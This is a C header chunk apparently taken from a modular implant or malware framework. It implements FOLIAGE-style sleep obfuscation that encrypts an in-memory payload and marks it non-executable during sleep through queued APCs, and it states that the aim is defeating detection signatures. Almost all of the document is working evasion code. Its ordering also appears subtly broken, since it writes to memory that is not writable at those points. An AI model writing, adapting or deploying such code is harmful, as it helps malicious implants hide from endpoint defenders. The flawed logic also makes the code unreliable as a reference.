// chunk: evasion/sleep_foliage
// depends: (none)
// provides: ekko_sleep
// headers: windows.h
// risk: low
// note: FOLIAGE-style sleep obfuscation — uses NtQueueApcThread + NtSignalAndWaitForSingleObject instead of timer queues. APCs execute in FIFO order when thread enters alertable state, defeating timer-queue-based detection signatures.

#ifndef CHUNK_SLEEP_FOLIAGE
#define CHUNK_SLEEP_FOLIAGE

typedef NTSTATUS (NTAPI *pfnNtQueueApcThread_fol)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS (NTAPI *pfnNtSignalAndWaitForSingleObject_fol)(HANDLE, HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *pfnNtTestAlert_fol)(void);
typedef NTSTATUS (NTAPI *pfnSystemFunction032_fol)(
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *data,
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *key
);

static volatile int g_foliage_initialized = 0;
static pfnNtQueueApcThread_fol g_fol_NtQueueApc = NULL;
static pfnNtSignalAndWaitForSingleObject_fol g_fol_NtSignalWait = NULL;
static pfnNtTestAlert_fol g_fol_NtTestAlert = NULL;
static pfnSystemFunction032_fol g_fol_SF032 = NULL;

static int foliage_init(void) {
    if (g_foliage_initialized) return 1;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (!ntdll || !advapi) return 0;

    g_fol_NtQueueApc = (pfnNtQueueApcThread_fol)GetProcAddress(ntdll, "NtQueueApcThread");
    g_fol_NtSignalWait = (pfnNtSignalAndWaitForSingleObject_fol)GetProcAddress(ntdll, "NtSignalAndWaitForSingleObject");
    g_fol_NtTestAlert = (pfnNtTestAlert_fol)GetProcAddress(ntdll, "NtTestAlert");
    g_fol_SF032 = (pfnSystemFunction032_fol)GetProcAddress(advapi, "SystemFunction032");

    if (!g_fol_NtQueueApc || !g_fol_NtSignalWait || !g_fol_NtTestAlert || !g_fol_SF032)
        return 0;

    g_foliage_initialized = 1;
    return 1;
}

static void foliage_crypt_region(BYTE *addr, DWORD size, BYTE *key, DWORD key_len) {
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } data_blob;
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } key_blob;

    data_blob.Buffer = addr;
    data_blob.Length = data_blob.MaximumLength = size;
    key_blob.Buffer = key;
    key_blob.Length = key_blob.MaximumLength = key_len;

    g_fol_SF032(&data_blob, &key_blob);
}

// APC wrappers — NtQueueApcThread only passes 3 args, so use static context
static BYTE *g_fol_base;
static DWORD g_fol_size;
static DWORD g_fol_old_protect;
static BYTE g_fol_key[16];
static DWORD g_fol_key_len;

static void NTAPI fol_apc_protect_rw(ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3) {
    (void)a1; (void)a2; (void)a3;
    VirtualProtect(g_fol_base, g_fol_size, PAGE_READWRITE, &g_fol_old_protect);
}

static void NTAPI fol_apc_encrypt(ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3) {
    (void)a1; (void)a2; (void)a3;
    foliage_crypt_region(g_fol_base, g_fol_size, g_fol_key, g_fol_key_len);
}

static void NTAPI fol_apc_decrypt(ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3) {
    (void)a1; (void)a2; (void)a3;
    foliage_crypt_region(g_fol_base, g_fol_size, g_fol_key, g_fol_key_len);
}

static void NTAPI fol_apc_protect_rx(ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3) {
    (void)a1; (void)a2; (void)a3;
    DWORD dummy;
    VirtualProtect(g_fol_base, g_fol_size, g_fol_old_protect, &dummy);
}

static void ekko_sleep(DWORD ms, BYTE *base, DWORD size) {
    if (!g_foliage_initialized && !foliage_init()) {
        Sleep(ms);
        return;
    }

    // Generate per-sleep random key
    DWORD tick = GetTickCount();
    for (int i = 0; i < 16; i++)
        g_fol_key[i] = (BYTE)((tick >> (i % 4 * 8)) ^ (i * 0x5C + 0x3E));
    g_fol_key_len = 16;

    // Set static context for APC wrappers
    g_fol_base = base;
    g_fol_size = size;

    HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!hEvent) { Sleep(ms); return; }

    HANDLE hThread = GetCurrentThread();

    // Queue APCs in FIFO order:
    // 1. Encrypt memory
    // 2. Change protection to RW (non-executable)
    g_fol_NtQueueApc(hThread, (PVOID)fol_apc_encrypt, 0, NULL, NULL);
    g_fol_NtQueueApc(hThread, (PVOID)fol_apc_protect_rw, 0, NULL, NULL);

    // Drain the encrypt+protect APCs by entering alertable state briefly
    g_fol_NtTestAlert();

    // Now sleep using NtSignalAndWaitForSingleObject — alertable wait
    LARGE_INTEGER timeout;
    timeout.QuadPart = -((LONGLONG)ms * 10000);

    HANDLE hEvent2 = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!hEvent2) {
        // Undo: restore protection and decrypt
        DWORD dummy;
        VirtualProtect(base, size, PAGE_EXECUTE_READ, &dummy);
        foliage_crypt_region(base, size, g_fol_key, g_fol_key_len);
        CloseHandle(hEvent);
        Sleep(ms);
        return;
    }

    // Queue post-sleep restoration APCs
    g_fol_NtQueueApc(hThread, (PVOID)fol_apc_protect_rx, 0, NULL, NULL);
    g_fol_NtQueueApc(hThread, (PVOID)fol_apc_decrypt, 0, NULL, NULL);
    g_fol_NtQueueApc(hThread, (PVOID)SetEvent, (PVOID)hEvent, NULL, NULL);

    // Enter alertable wait for sleep duration — APCs fire when it expires
    g_fol_NtSignalWait(hEvent2, hEvent, TRUE, &timeout);

    // Process any remaining pending APCs
    g_fol_NtTestAlert();

    // Wait for completion signal
    WaitForSingleObject(hEvent, 1000);

    CloseHandle(hEvent);
    CloseHandle(hEvent2);
    SecureZeroMemory(g_fol_key, sizeof(g_fol_key));
}

#endif
